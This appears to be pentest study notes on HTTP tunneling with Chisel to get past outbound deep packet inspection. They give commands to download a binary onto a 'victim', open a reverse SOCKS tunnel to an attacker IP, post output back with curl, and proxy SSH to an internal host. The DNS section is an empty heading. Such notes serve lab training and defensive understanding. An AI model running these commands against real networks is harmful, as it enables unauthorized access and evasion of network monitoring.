# Reason use
1. Deep Packet Inspection (app layer 7) of Outbound is inplemented
2. Only some format/protocol of data can use e.g. HTTP, DNS
3. Use tunneling

# HTTP Tunneling
## Chisel
- choose correct version & architecture: https://github.com/jpillora/chisel/releases
- transfer chisel to victim ``` bash -c 'wget "http://192.168.118.4/chisel" -O /tmp/chisel && chmod +x /tmp/chisel' ```
- kali host: ``` chisel server --port 8080 --reverse ```
- run chisel client in victim: ``` /tmp/chisel client 192.168.118.4:8080 R:socks > /dev/null 2>&1 & ```
- run with error output: ``` /tmp/chisel client 192.168.118.4:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://192.168.118.4:8080/ ```
- Debug with tcp packet anaylsis: ``` sudo tcpdump -nvvvXi tun0 tcp port 8080 ```
- OR check status of socks (same as be4): ``` ss -ntplu ```
- use ncat w/ Proxycommand to connect ``` ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215 ``` 

### Support local port / dynamic port fwing 
- local version like this (in victim) ``` /tmp/chisel client 192.168.45.225:8080 R:1080:10.4.225.215:8008  ```
- check this doc: https://exploit-notes.hdks.org/exploit/network/port-forwarding/port-forwarding-with-chisel/ 


# DNS 